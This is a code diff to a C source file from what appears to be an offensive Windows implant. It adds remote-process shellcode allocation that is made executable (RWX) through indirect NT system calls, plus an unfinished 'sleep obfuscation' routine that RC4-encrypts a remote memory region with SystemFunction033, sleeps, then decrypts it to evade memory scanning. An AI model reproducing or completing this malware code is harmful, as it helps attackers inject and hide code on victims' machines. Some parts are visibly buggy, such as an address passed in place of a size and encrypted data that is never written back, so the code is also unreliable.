@@ -16,8 +16,17 @@
 #define UNSED_PEB_FIELD 0x340
 
 extern Ade GlobalAde;
-
 static NTSTATUS status;
+
+typedef NTSTATUS(WINAPI* _SystemFunction033)(
+	UNICODE_STRING *memoryRegion,
+	UNICODE_STRING *keyPointer
+);
+
+typedef struct TEMP_DATA_CALL_ {
+    LPVOID Address;
+    SIZE_T Size; 
+} TEMP_DATA_CALL;
 
 NTSTATUS CustomSetThreadDescription(HANDLE hThread, BYTE* buf, SIZE_T bufSize) {
     AdeSinner      sinner;
@@ -58,6 +67,7 @@ WINBOOL ThreadNameAlloc(
     size_t shellcodeSize,
     MEMORY_ALLOC* MemoryAllocOut 
 ) {
+    TEMP_DATA_CALL            tempDataCall;
     AdeSinner                 sinner;
     ULONG_PTR                 pebField; // UNUSED PEB FIELD
     PPEB                      ptrPeb;
@@ -152,10 +162,10 @@ WINBOOL ThreadNameAlloc(
     //
     // Read the new allocation addr into PEB field
     //
-    void* ptrShellcode = NULL;
+    void* ptrShellcode   = NULL;
     CallAde(sinner, "NtReadVirtualMemory", status,
         hProcess,
-        (LPVOID) pebField,
+        (LPVOID)pebField,
         &ptrShellcode,
         sizeof(void*),
         NULL
@@ -171,12 +181,12 @@ WINBOOL ThreadNameAlloc(
     // Set to RWX
     //
     DWORD oldProtection   = 0x0;
-    PVOID ptrShellcode_   = ptrShellcode;
-    SIZE_T shellcodeSize_ = shellcodeSize;
+    tempDataCall.Address  = ptrShellcode;
+    tempDataCall.Size     = shellcodeSize;
     CallAde(sinner, "NtProtectVirtualMemory", status,
         hProcess,
-        &ptrShellcode_,
-        &shellcodeSize_,
+        &tempDataCall.Address,
+        &tempDataCall.Address,
         PAGE_EXECUTE_READWRITE,
         &oldProtection
     );
@@ -192,9 +202,141 @@ WINBOOL ThreadNameAlloc(
 }
 
 //
-// Stack & Heap encryption 
+// Stack & Heap encryption - TODO: finish and try
 //
-VOID TimerPastaAlPestoEPomodoro(ULONG time) {
+WINBOOL TimerPastaAlPestoEPomodoro(HANDLE hProcess, LPVOID ptrRegion, SIZE_T regionSize, ULONG time, UNICODE_STRING key) {
+    TEMP_DATA_CALL tempDataCall;
+    AdeSinner      sinner;
 
+    _SystemFunction033 SystemFunction033 = (_SystemFunction033) 
+        GetProcAddress( LoadLibraryA("advapi32.dll"), "SystemFunction033" );
 
+    // +==============+
+    //    Encryption
+    // +==============+
+
+    //
+    // Read the region to encrypt
+    //
+    PBYTE regionData = malloc(regionSize);
+    CallAde(sinner, "NtReadVirtualMemory", status,
+        hProcess,
+        ptrRegion,
+        regionData,
+        regionSize,
+        NULL
+    );
+
+    if ( NT_ERROR(status) ) {
+        DEBUG_ERROR("NtReadVirtualMemory: 0x%lx", status);
+        return FALSE;
+    }
+
+    //
+    // Create the encryotion/decryption buffer
+    //
+    UNICODE_STRING buffer = {
+        .Buffer = ptrRegion,
+        .Length = regionSize,
+        .MaximumLength = regionSize
+    };
+
+    //
+    // Encrypt the region-data
+    //
+    status = SystemFunction033(
+        &buffer,
+        &key
+    );
+
+    if ( NT_ERROR(status) ) {
+        DEBUG_ERROR("SystemFunction033: 0x%lx", status);
+        return FALSE;
+    }
+
+    //
+    // Write the encrypted region-data
+    //
+
+    CallAde(sinner, "NtWriteVirtualMemory", status,
+        hProcess,
+        ptrRegion,
+        regionData,
+        regionSize,
+        NULL
+
+    );
+
+    if ( NT_ERROR(status) ) {
+        DEBUG_ERROR("NtWriteVirtualMemory: 0x%lx", status);
+        return FALSE;
+    }
+
+    //
+    // Wait X time
+    //
+
+    free(regionData);
+    Sleep(time);
+
+    // +==============+
+    //    Decryption
+    // +==============+
+
+    //
+    // Read the region to decrypt
+    //
+    regionData = malloc(regionSize);
+    CallAde(sinner, "NtReadVirtualMemory", status,
+        hProcess,
+        ptrRegion,
+        regionData,
+        regionSize,
+        NULL
+    );
+
+    if ( NT_ERROR(status) ) {
+        DEBUG_ERROR("NtReadVirtualMemory: 0x%lx", status);
+        return FALSE;
+    }
+
+    //
+    // Modify the encryption/decryption buffer
+    //
+
+    buffer.Buffer = ptrRegion;
+    
+    //
+    // Decrypt the region-data
+    //
+
+    status = SystemFunction033(
+        &buffer,
+        &key
+    );
+
+    if ( NT_ERROR(status) ) {
+        DEBUG_ERROR("SystemFunction033: 0x%lx", status);
+        return FALSE;
+    }
+
+    //
+    // Write decrypted region-data
+    //
+
+    CallAde(sinner, "NtWriteVirtualMemory", status,
+        hProcess,
+        ptrRegion,
+        regionData,
+        regionSize,
+        NULL
+
+    );
+
+    if ( NT_ERROR(status) ) {
+        DEBUG_ERROR("NtWriteVirtualMemory: 0x%lx", status);
+        return FALSE;
+    }
+
+    return TRUE;
 }
